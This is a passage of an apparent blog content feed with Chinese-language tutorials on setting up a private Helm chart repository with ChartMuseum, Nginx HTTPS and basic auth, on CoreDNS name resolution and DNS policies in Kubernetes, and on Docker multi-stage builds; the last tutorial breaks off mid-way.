<td>需要手动恢复旧版本的 YAML 文件，操作复杂且容易出错。</td>
<td>一键回滚到任意历史版本，简单高效。</td>
</tr>
<tr>
<td><strong>差异追踪</strong></td>
<td>难以知道两个版本之间的具体差异，容易遗漏更改。</td>
<td>Helm 自动计算差异，确保所有更改都被正确应用。</td>
</tr>
<tr>
<td><strong>配置灵活性</strong></td>
<td>需要手动编辑多个 YAML 文件，难以适应不同环境（如 dev、staging、prod）。</td>
<td>支持参数化配置，通过 <code>values.yaml</code> 动态调整，适应不同环境需求。</td>
</tr>
<tr>
<td><strong>依赖管理</strong></td>
<td>需要手动管理依赖关系，容易遗漏或冲突。</td>
<td>自动管理依赖关系，确保所有组件协同工作。</td>
</tr>
</tbody></table>
<h1><span id="参考">参考</span></h1><p><a href="https://helm.sh/docs/topics/charts/">https://helm.sh/docs/topics/charts/</a></p>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 ChartMuseum 容器搭建私有 Helm Chart 仓库</title>
    <url>/2025/0323165015.html</url>
    <content><![CDATA[<h1><span id="前言">前言</span></h1><p>本文介绍如何在 Rocky Linux 9.5 上使用 ChartMuseum 搭建一个私有的 Helm Chart 仓库，并启用 HTTPS 和 Basic 认证以提高安全性</p>
<h1><span id="环境准备">环境准备</span></h1><ul>
<li>一台Rocky Linux 9.5 x86_64, 作为Helm Repo, 安装Docker, 域名: <code>myhelmrepo.com</code></li>
<li>Kubernetes 集群 v1.28.x, Helm v3.16.0</li>
</ul>
<h1><span id="1-安装并启动-chartmuseum">1. 安装并启动 ChartMuseum</span></h1><p>(1) 启动 ChartMuseum 容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  --name private-helm-repo \</span><br><span class="line">  -p 8080:8080 \</span><br><span class="line">  --restart=always \</span><br><span class="line">  -e STORAGE=local \</span><br><span class="line">  -e STORAGE_LOCAL_ROOTDIR=/charts \</span><br><span class="line">  -v /charts:/charts \</span><br><span class="line">  --user root \</span><br><span class="line">  swr.cn-north-4.myhuaweicloud.com/ddn-k8s/ghcr.io/helm/chartmuseum:v0.16.2</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>(2) 验证 ChartMuseum 是否正常运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://myhelmrepo.com:8080/index.yaml</span><br></pre></td></tr></table></figure>

<p>如果返回类似以下内容，则说明服务已成功启动：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">entries: &#123;&#125;</span><br><span class="line">generated: &quot;2025-03-23T07:32:46Z&quot;</span><br><span class="line">serverInfo: &#123;&#125;</span><br></pre></td></tr></table></figure>

<h1><span id="2-上传-helm-chart-到仓库">2. 上传 Helm Chart 到仓库</span></h1><p>(1) 上传 Chart<br>假设你有一个名为 <a href="https://github.com/PCJ600/helm-chart-demo/blob/main/charts/flask-app-chart-0.1.0.tgz">flask-app-chart-0.1.0.tgz</a> 的 Helm Chart，可以通过以下命令将其上传到仓库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl --data-binary &quot;@flask-app-chart-0.1.0.tgz&quot; http://myhelmrepo.com:8080/api/charts</span><br></pre></td></tr></table></figure>
<p>如果返回以下内容，则表示上传成功：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;saved&quot;:true&#125;</span><br></pre></td></tr></table></figure>
<p>(2) 验证上传结果<br>再次检查 index.yaml 文件以确认 Chart 成功添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://myhelmrepo.com:8080/index.yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">entries:</span><br><span class="line">  flask-app-chart:</span><br><span class="line">  - apiVersion: v2</span><br><span class="line">    appVersion: &quot;1.0&quot;</span><br><span class="line">    created: &quot;2025-03-23T07:38:06.252423409Z&quot;</span><br><span class="line">    description: A Helm chart for deploying a simple Flask app</span><br><span class="line">    digest: c6ad11cf3c0b9c2068b5cb3502c8faabc700646b4a7fe9d1c3e779827658a474</span><br><span class="line">    name: flask-app-chart</span><br><span class="line">    type: application</span><br><span class="line">    urls:</span><br><span class="line">    - charts/flask-app-chart-0.1.0.tgz</span><br><span class="line">    version: 0.1.0</span><br><span class="line">generated: &quot;2025-03-23T07:38:06Z&quot;</span><br><span class="line">serverInfo: &#123;&#125;</span><br></pre></td></tr></table></figure>

<h1><span id="3-添加私有-helm-仓库">3. 添加私有 Helm 仓库</span></h1><p>(1) 添加私有仓库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm repo add my-private-repo http://myhelmrepo.com:8080</span><br></pre></td></tr></table></figure>
<p>更新仓库缓存：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm repo update</span><br></pre></td></tr></table></figure>
<p>如果返回以下内容，则表示仓库添加成功：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hang tight while we grab the latest from your chart repositories...</span><br><span class="line">...Successfully got an update from the &quot;my-private-repo&quot; chart repository</span><br><span class="line">Update Complete. ⎈Happy Helming!⎈</span><br></pre></td></tr></table></figure>
<p>(2) 查看仓库列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm repo list</span><br><span class="line"></span><br><span class="line">NAME            URL</span><br><span class="line">my-private-repo http://myhelmrepo.com:8080</span><br></pre></td></tr></table></figure>
<p>(3) 查看仓库中的 Charts</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm search repo -l flask</span><br><span class="line"></span><br><span class="line">NAME                            CHART VERSION   APP VERSION     DESCRIPTION</span><br><span class="line">my-private-repo/flask-app-chart 0.1.0           1.0             A Helm chart for deploying a simple Flask app</span><br></pre></td></tr></table></figure>

<h1><span id="4-下载或安装-chart">4. 下载或安装 Chart</span></h1><p>(1) 下载 Chart<br>下载刚才上传的 Chart：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm pull my-private-repo/flask-app-chart</span><br></pre></td></tr></table></figure>
<p>解压并查看内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -tvf flask-app-chart-0.1.0.tgz</span><br></pre></td></tr></table></figure>
<p>(2) 安装 Chart<br>通过以下命令安装 Chart：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm install flask-app my-private-repo/flask-app-chart --namespace flask-app</span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li>flask-app: 指定本次安装的 Release 名称。</li>
<li>my-private-repo&#x2F;flask-app-chart: 指定 Chart 的完整路径。</li>
<li>–namespace flask-app: 指定安装的目标命名空间。</li>
</ul>
<h1><span id="5-启用-https-和-basic-认证">5. 启用 HTTPS 和 Basic 认证</span></h1><p>为了提高安全性，在生产环境中需要启用 HTTPS 和 Basic 认证。</p>
<p>(1) 安装相关软件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install nginx httpd-tools -y</span><br></pre></td></tr></table></figure>
<p>(2) 启用 Basic 认证<br>重新启动 ChartMuseum 容器并启用认证：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">  --name private-helm-repo \</span><br><span class="line">  -p 127.0.0.1:8080:8080 \</span><br><span class="line">  --restart=always \</span><br><span class="line">  -e STORAGE=local \</span><br><span class="line">  -e STORAGE_LOCAL_ROOTDIR=/charts \</span><br><span class="line">  -v /charts:/charts \</span><br><span class="line">  -e AUTH_ANONYMOUS_GET=false \</span><br><span class="line">  -e BASIC_AUTH_USER=helmuser \</span><br><span class="line">  -e BASIC_AUTH_PASS=123456 \</span><br><span class="line">  --user root \</span><br><span class="line">  swr.cn-north-4.myhuaweicloud.com/ddn-k8s/ghcr.io/helm/chartmuseum:v0.16.2</span><br></pre></td></tr></table></figure>
<p>测试认证是否生效：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 不带认证访问</span><br><span class="line">curl localhost:8080</span><br><span class="line"># 返回 &#123;&quot;error&quot;:&quot;unauthorized&quot;&#125;</span><br><span class="line"></span><br><span class="line"># 带认证访问</span><br><span class="line">curl -u helmuser:123456 localhost:8080</span><br><span class="line"># 返回 200 OK</span><br></pre></td></tr></table></figure>
<p>(3) 启用 HTTPS<br>生成自签名证书, 创建目录并生成自签名 SANs 证书：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p /etc/nginx/ssl/myhelmrepo.com</span><br><span class="line">cd /etc/nginx/ssl/myhelmrepo.com</span><br></pre></td></tr></table></figure>
<p>创建 OpenSSL 配置文件（openssl.cnf）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ req ]</span><br><span class="line">default_bits       = 2048</span><br><span class="line">distinguished_name = req_distinguished_name</span><br><span class="line">req_extensions     = req_ext</span><br><span class="line">prompt             = no</span><br><span class="line"></span><br><span class="line">[ req_distinguished_name ]</span><br><span class="line">C  = CN</span><br><span class="line">ST = State</span><br><span class="line">L  = City</span><br><span class="line">O  = Organization</span><br><span class="line">OU = Organizational Unit</span><br><span class="line">CN = myhelmrepo.com</span><br><span class="line"></span><br><span class="line">[ req_ext ]</span><br><span class="line">subjectAltName = @alt_names</span><br><span class="line"></span><br><span class="line">[ alt_names ]</span><br><span class="line">DNS.1 = myhelmrepo.com</span><br><span class="line">DNS.2 = localhost</span><br><span class="line">IP.1 = 127.0.0.1</span><br></pre></td></tr></table></figure>
<p>生成证书和密钥：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -config openssl.cnf -extensions &#x27;req_ext&#x27; -nodes -days 365 -newkey rsa:2048 \</span><br><span class="line">  -keyout /etc/nginx/ssl/myhelmrepo.com/myhelmrepo.com.key \</span><br><span class="line">  -out /etc/nginx/ssl/myhelmrepo.com/myhelmrepo.com.crt</span><br></pre></td></tr></table></figure>
<p>编辑 Nginx 主配置文件(&#x2F;etc&#x2F;nginx&#x2F;nginx.conf)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    server_name myhelmrepo.com;</span><br><span class="line"></span><br><span class="line">    ssl_certificate /etc/nginx/ssl/myhelmrepo.com/myhelmrepo.com.crt;</span><br><span class="line">    ssl_certificate_key /etc/nginx/ssl/myhelmrepo.com/myhelmrepo.com.key;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://localhost:8080;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重启 Nginx：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart nginx</span><br></pre></td></tr></table></figure>
<p>测试 HTTPS</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://myhelmrepo.com/index.yaml -k</span><br><span class="line"># 返回 401 Authorization Required</span><br><span class="line"></span><br><span class="line">curl -u helmuser:123456 https://myhelmrepo.com/index.yaml -k</span><br><span class="line"># 返回 200 OK</span><br></pre></td></tr></table></figure>
<p>(4) 配置 Helm 使用 HTTPS<br>由于使用的是自签名证书，Helm默认无法信任。将证书复制到本地并配置 Helm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p ~/.helm/certs</span><br><span class="line">scp root@myhelmrepo.com:/etc/nginx/ssl/myhelmrepo.com/myhelmrepo.com.crt ~/.helm/certs/</span><br></pre></td></tr></table></figure>
<p>重新添加仓库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm repo rm my-private-repo</span><br><span class="line">helm repo add my-private-repo https://myhelmrepo.com \</span><br><span class="line">  --ca-file ~/.helm/certs/myhelmrepo.com.crt \</span><br><span class="line">  --username helmuser \</span><br><span class="line">  --password 123456</span><br></pre></td></tr></table></figure>
<p>更新仓库缓存并查看Chart</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm repo update</span><br><span class="line">helm search repo -l flask</span><br><span class="line">NAME                            CHART VERSION   APP VERSION     DESCRIPTION</span><br><span class="line">my-private-repo/flask-app-chart 0.1.0           1.0             A Helm chart for deploying a simple Flask app</span><br></pre></td></tr></table></figure>
<p>安装Chart, 测试OK</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">helm install flask-app my-private-repo/flask-app-chart --namespace flask-app</span><br></pre></td></tr></table></figure>

<h1><span id="参考">参考</span></h1><p>【1】<a href="https://chartmuseum.com/docs/">https://chartmuseum.com/docs/</a></p>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>理解Kubernetes中CoreDNS域名解析与DNS策略</title>
    <url>/2025/0325230650.html</url>
    <content><![CDATA[<h1><span id="coredns是什么">CoreDNS是什么</span></h1><p>CoreDNS是一个灵活可扩展的DNS服务器，使用Go语言编写，旨在提供快速、灵活的DNS服务</p>
<h1><span id="为什么需要coredns">为什么需要CoreDNS</span></h1><p>CoreDNS为Kubernetes集群内部的DNS解析提供服务，使得服务之间能够通过域名互相通信<br>Kubernetes集群中, CoreDNS是运行在kube-system这个namespace下的Pod</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl -n kube-system get pod coredns-66f779496c-b7mmz</span><br><span class="line">NAME                       READY   STATUS    RESTARTS      AGE</span><br><span class="line">coredns-66f779496c-b7mmz   1/1     Running   4 (28m ago)   4d23h</span><br></pre></td></tr></table></figure>

<h1><span id="k8s集群中的域名是如何解析的">k8s集群中的域名是如何解析的</span></h1><p>比如服务a访问服务b:</p>
<ul>
<li>如果a和b在同一个namespace下, 可以直接在pod a中, 通过<code>curl b</code>来访问b</li>
<li>如果a和b不在同一个namespace下, 在pod a中需要通过<code>curl b.namespaceb</code>来访问b</li>
</ul>
<p>以下动手测试</p>
<span id="more"></span>

<h2><span id="测试同一个namespace下的服务间域名解析">测试同一个namespace下的服务间域名解析</span></h2><p>创建一个名为foo的namespace, 再创建两个Flask服务(svca, svcb)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get all -n foo</span><br><span class="line">NAME                        READY   STATUS    RESTARTS   AGE</span><br><span class="line">pod/svca-78f6c85d4-sd97h    1/1     Running   0          43s</span><br><span class="line">pod/svcb-5fccb7d86b-mkqg7   1/1     Running   0          43s</span><br><span class="line"></span><br><span class="line">NAME           TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)    AGE</span><br><span class="line">service/svca   ClusterIP   10.98.115.242    &lt;none&gt;        8000/TCP   24s</span><br><span class="line">service/svcb   ClusterIP   10.111.107.194   &lt;none&gt;        8000/TCP   23s</span><br><span class="line"></span><br><span class="line">NAME                   READY   UP-TO-DATE   AVAILABLE   AGE</span><br><span class="line">deployment.apps/svca   1/1     1            1           24s</span><br><span class="line">deployment.apps/svcb   1/1     1            1           23s</span><br></pre></td></tr></table></figure>

<p>进入pod a, 通过<code>curl http://svcb</code> 访问 b</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl exec -it pod/svca-78f6c85d4-sd97h -n foo -- sh</span><br><span class="line"></span><br><span class="line"># curl http://svcb:8000</span><br><span class="line">hello foo</span><br></pre></td></tr></table></figure>

<h2><span id="测试不同namespace下的服务间域名解析">测试不同namespace下的服务间域名解析</span></h2><p>两个服务(svca, svcb), svca在foo命名空间, svcb在bar命名空间, 在pod a中访问b, 使用<code>curl http://svcb.bar</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl exec -it pod/svca-78f7c85d4-sd97h -n foo -- sh</span><br><span class="line"># curl http://svcb.bar:8000</span><br><span class="line">hello foo</span><br></pre></td></tr></table></figure>

<h2><span id="为什么同一namespace下-直接访问服务名ltservice-namegt就可以-不同namespace下-必须带上namespaceltservice-namegtltnamespacegt">为什么同一Namespace下, 直接访问服务名<code>&lt;service-name&gt;</code>就可以, 不同Namespace下, 必须带上namespace(<code>&lt;service-name&gt;.&lt;namespace&gt;</code>) ?</span></h2><p>进入pod a, 查看<code>/etc/resolve.conf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search foo.svc.cluster.local svc.cluster.local cluster.local</span><br><span class="line">nameserver 10.96.0.10</span><br><span class="line">options ndots:5</span><br></pre></td></tr></table></figure>

<p>这里的DNS Server(10.96.0.10)是kube-dns的ClusterIP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl -n kube-system get svc</span><br><span class="line">NAME       TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)                  AGE</span><br><span class="line">kube-dns   ClusterIP   10.96.0.10   &lt;none&gt;        53/UDP,53/TCP,9153/TCP   9d</span><br></pre></td></tr></table></figure>

<p>查看<code>/etc/resolv.conf</code>, 其中的关键点在于search指令和ndots选项：</p>
<ul>
<li>search：这个指令定义了一系列的后缀，当DNS查询失败时，会依次尝试将这些后缀附加到原始查询域名后面，直到找到匹配项或所有后缀都已尝试过。</li>
<li>ndots：如果一个域名中包含的点（.）数量小于ndots值，则该域名会被认为是“不完整”的域名。在这种情况下，DNS 客户端会尝试将 &#x2F;etc&#x2F;resolv.conf 中的 search 路径逐一追加到该域名后进行解析。如果域名中的点数大于或等于 ndots，则直接将其作为完整的域名进行查询。</li>
</ul>
<p>k8s集群中某个服务完整的域名格式是<code>&lt;service-name&gt;.&lt;namespace&gt;.svc.&lt;cluster-domain&gt;</code>, 验证一下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># nslookup svcb.foo.svc.cluster.local 10.96.0.10</span><br><span class="line">Server:         10.96.0.10</span><br><span class="line">Address:        10.96.0.10#53</span><br><span class="line"></span><br><span class="line">Name:   svcb.foo.svc.cluster.local</span><br><span class="line">Address: 10.111.107.194</span><br></pre></td></tr></table></figure>

<p><strong>同一命名空间下的服务访问</strong><br>CoreDNS会按照<code>svcb.foo.svc.cluster.local</code> -&gt; <code>svcb.svc.cluster.local</code> -&gt; <code>svcb.cluster.local</code>顺序解析, 可以看出第一次解析(<code>svcb.foo.svc.cluster.local</code>)就会成功</p>
<p><strong>不同命名空间下的服务访问</strong><br>必须使用<code>&lt;service-name&gt;.&lt;namespace&gt;</code>的形式，例如<code>svcb.bar</code>, CoreDNS会按照 <code>svcb.bar.foo.svc.cluster.local</code> -&gt; <code>svcb.bar.svc.cluster.local</code> -&gt; <code>svcb.bar.cluster.local</code>, 可以看出第二次解析(<code>svcb.bar.svc.cluster.local</code>)就会成功</p>
<h2><span id="访问外部域名是否走search域">访问外部域名是否走search域 ?</span></h2><p>测试一下, 进入pod, 使用nslookup指定coreDNS, 查询外部域名<code>www.trendmicro.com</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl -n bar exec -it svcb-5fccb7d86b-wj6nv -- sh</span><br><span class="line">sh-5.1# nslookup www.trendmicro.com 10.96.0.10</span><br><span class="line">Server:         10.96.0.10</span><br><span class="line">Address:        10.96.0.10#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">www.trendmicro.com      canonical name = ion.trendmicro.com.edgekey.net.</span><br><span class="line">ion.trendmicro.com.edgekey.net  canonical name = e3576.a.akamaiedge.net.</span><br><span class="line">Name:   e3576.a.akamaiedge.net</span><br><span class="line">Address: 23.217.64.161</span><br><span class="line"></span><br><span class="line">抓包</span><br><span class="line"># tcpdump -i eth0 udp</span><br><span class="line">dropped privs to tcpdump</span><br><span class="line">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode</span><br><span class="line">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes</span><br><span class="line">13:13:54.687483 IP svcb-5fccb7d86b-wj6nv.37345 &gt; kube-dns.kube-system.svc.cluster.local.domain: 44803+ A? www.trendmicro.com.bar.svc.cluster.local. (58)</span><br><span class="line">13:13:54.687791 IP kube-dns.kube-system.svc.cluster.local.domain &gt; svcb-5fccb7d86b-wj6nv.37345: 44803 NXDomain*- 0/1/0 (151)</span><br><span class="line">13:13:54.688531 IP svcb-5fccb7d86b-wj6nv.47832 &gt; kube-dns.kube-system.svc.cluster.local.domain: 45213+ A? www.trendmicro.com.svc.cluster.local. (54)</span><br><span class="line">13:13:54.688671 IP kube-dns.kube-system.svc.cluster.local.domain &gt; svcb-5fccb7d86b-wj6nv.47832: 45213 NXDomain*- 0/1/0 (147)</span><br><span class="line">13:13:54.688877 IP svcb-5fccb7d86b-wj6nv.56239 &gt; kube-dns.kube-system.svc.cluster.local.domain: 52750+ A? www.trendmicro.com.cluster.local. (50)</span><br><span class="line">13:13:54.689073 IP kube-dns.kube-system.svc.cluster.local.domain &gt; svcb-5fccb7d86b-wj6nv.56239: 52750 NXDomain*- 0/1/0 (143)</span><br><span class="line">13:13:54.689225 IP svcb-5fccb7d86b-wj6nv.41094 &gt; kube-dns.kube-system.svc.cluster.local.domain: 46754+ A? www.trendmicro.com. (36)</span><br><span class="line">13:13:54.720336 IP svcb-5fccb7d86b-wj6nv.36285 &gt; kube-dns.kube-system.svc.cluster.local.domain: 55747+ PTR? 10.0.96.10.in-addr.arpa. (41)</span><br><span class="line">13:13:54.721011 IP kube-dns.kube-system.svc.cluster.local.domain &gt; svcb-5fccb7d86b-wj6nv.36285: 55747*- 1/0/0 PTR kube-dns.kube-system.svc.cluster.local. (116)</span><br><span class="line">13:13:54.731442 IP kube-dns.kube-system.svc.cluster.local.domain &gt; svcb-5fccb7d86b-wj6nv.41094: 46754 3/0/0 CNAME ion.trendmicro.com.edgekey.net., CNAME e3576.a.akamaiedge.net., A 23.208.168.135 (202)</span><br><span class="line">13:13:54.735385 IP svcb-5fccb7d86b-wj6nv.37844 &gt; kube-dns.kube-system.svc.cluster.local.domain: 29753+ AAAA? e3576.a.akamaiedge.net. (40)</span><br><span class="line">13:13:54.775441 IP kube-dns.kube-system.svc.cluster.local.domain &gt; svcb-5fccb7d86b-wj6nv.37844: 29753 0/1/0 (131)</span><br><span class="line">————————————————</span><br></pre></td></tr></table></figure>
<p>可以看出, 解析<code>www.trendmicro.com</code>走了search域, 有3次无用的DNS请求<br><code>www.trendmicro.com.bar.svc.cluster.local. -&gt; www.trendmicro.com.svc.cluster.local. -&gt;  www.trendmicro.com.cluster.local. -&gt; www.trendmicro.com.</code></p>
<p>如果我们只用到了同namespace下的访问、或者跨namespace下的service访问, 可以把ndots默认值改成2, 减少DNS查询, 提高性能</p>
<h1><span id="kubernetes-dns-策略">Kubernetes DNS 策略</span></h1><p>在Kubernetes中，dnsPolicy字段定义了Pod的DNS配置策略，提供了四种不同的策略：ClusterFirst、 ClusterFirstWithHostNet、 Default 和 None</p>
<h3><span id="clusterfirst默认">ClusterFirst（默认）</span></h3><p>Kubernetes的默认DNS策略, Pod优先使用CoreDNS进行域名解析, 如果CoreDNS无法解析，回退到宿主机的DNS配置进行解析<br>这是最常见的配置, 适用于需要访问集群内其他服务的应用</p>
<h3><span id="clusterfirstwithhostnet">ClusterFirstWithHostNet</span></h3><p>这个策略专为使用主机网络(hostNetwork: true）的Pod设计, 仍然优先使用CoreDNS进行解析<br>适用于需要直接监听宿主机上网络接口, 但仍需访问集群内其他服务的应用</p>
<h3><span id="default">Default</span></h3><p>使用宿主机的DNS设置，完全不使用CoreDNS<br>适用于主要访问外部服务的应用, 避免CoreDNS解析外部域名带来的延迟问题</p>
<h3><span id="none">None</span></h3><p>完全忽略Kubernetes和宿主机的DNS配置，要求用户自行指定DNS设置。 适用于对DNS配置有高度定制需求的应用. 配置示例如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: custom-dns-pod</span><br><span class="line">spec:</span><br><span class="line">  dnsPolicy: None</span><br><span class="line">  dnsConfig:</span><br><span class="line">    nameservers:</span><br><span class="line">      - 8.8.8.8</span><br><span class="line">      - 8.8.4.4</span><br><span class="line">    searches:</span><br><span class="line">      - ns1.svc.cluster.local</span><br><span class="line">      - mycompany.local</span><br><span class="line">    options:</span><br><span class="line">      - name: ndots</span><br><span class="line">        value: &quot;2&quot;</span><br><span class="line">      - name: edns0</span><br></pre></td></tr></table></figure>


<h2><span id="参考">参考</span></h2><p>【1】 <a href="https://coredns.io/manual/toc/">https://coredns.io/manual/toc/</a><br>【2】 <a href="https://cloud.tencent.com/developer/article/2126510">https://cloud.tencent.com/developer/article/2126510</a></p>
]]></content>
      <categories>
        <category>Kubernetes</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Docker多阶段构建, 压缩镜像体积</title>
    <url>/2025/0329204106.html</url>
    <content><![CDATA[<h1><span id="什么是-docker-多阶段构建">什么是 Docker 多阶段构建</span></h1><p>Docker 多阶段构建是一种通过在单个 Dockerfile 中定义多个构建阶段的技术。 每个阶段可以使用不同的基础镜像和依赖项，允许开发人员在构建过程中分离应用程序的编译环境与运行环境。 最终生成的镜像只包含运行应用程序所需的文件，而无需携带编译工具链或其他不必要的依赖<br>通过多阶段构建，可以有效减少镜像体积，提升部署效率</p>
<h1><span id="实例-多阶段构建压缩-docker-镜像">实例: 多阶段构建压缩 Docker 镜像</span></h1><p>下面通过一个简单的 Go 程序，分别用传统方式和多阶段构建两种方法演示如何构建 Docker 镜像，并观察多阶段构建对镜像大小的显著优化效果</p>
<h2><span id="准备工作">准备工作</span></h2><ul>
<li>安装 Docker</li>
<li>编写一个简单的 Go 程序 hello.go</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello, World!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2><span id="传统构建方法">传统构建方法</span></h2><p>Dockerfile如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第一阶段：构建环境</span><br><span class="line">FROM rockylinux:9.3</span><br><span class="line"></span><br><span class="line"># 安装Go环境</span><br><span class="line">RUN dnf install -y golang git</span><br><span class="line"></span><br><span class="line">WORKDIR /app</span><br><span class="line"></span><br><span class="line"># 将本地代码复制到容器中</span><br><span class="line">COPY . .</span><br><span class="line"></span><br><span class="line"># 初始化Go模块</span><br><span class="line">RUN go mod init example.com/hello</span><br><span class="line"></span><br><span class="line"># 编译Go程序，静态链接</span><br><span class="line">RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o hello .</span><br><span class="line"></span><br><span class="line"># 指定启动命令</span><br><span class="line">CMD [&quot;./hello&quot;]</span><br></pre></td></tr></table></figure>
<p>缺点：包含了完整的编译工具链（如 Go 编译器）以及操作系统的基础包，导致镜像体积庞大</p>
<p>构建与运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t hello:1.0 .</span><br><span class="line">docker run -it --rm hello:1.0</span><br><span class="line">Hello, World!</span><br></pre></td></tr></table></figure>
<p>查看镜像大小</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># docker images</span><br><span class="line">REPOSITORY        TAG        IMAGE ID       CREATED          SIZE</span><br><span class="line">hello             1.0        3a1caaa45859   10 minutes ago   671MB</span><br></pre></td></tr></table></figure>

<h2><span id="多阶段构建方法">多阶段构建方法</span></h2><p>为了减小镜像体积，我们采用多阶段构建技术，将编译环境与运行环境分离</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第一阶段：构建环境</span><br><span class="line">FROM rockylinux:9.3 AS builder</span><br><span class="line"></span><br><span class="line"># 安装Go环境</span><br><span class="line">RUN dnf install -y golang git</span><br><span class="line"></span><br><span class="line">WORKDIR /app</span><br><span class="line"></span><br><span class="line"># 将本地代码复制到容器中</span><br><span class="line">COPY . .</span><br><span class="line"></span><br><span class="line"># 初始化Go模块</span><br><span class="line">RUN go mod init example.com/hello</span><br><span class="line"></span><br><span class="line"># 编译Go程序，静态链接</span><br><span class="line">RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o hello .</span><br><span class="line"></span><br><span class="line"># 第二阶段：运行环境</span><br><span class="line">FROM rockylinux:9.3 AS runner</span><br><span class="line"></span><br><span class="line"># 从构建阶段复制可执行文件</span><br><span class="line">COPY --from=builder /app/hello .</span><br><span class="line"></span><br><span class="line"># 指定启动命令</span><br><span class="line">CMD [&quot;./hello&quot;]</span><br></pre></td></tr></table></figure>

<p>构建与运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t hello-multi-stage:1.0 .</span><br><span class="line">docker run -it --rm hello-multi-stage:1.0</span><br></pre></td></tr></table></figure>
<p>查看镜像大小</p>
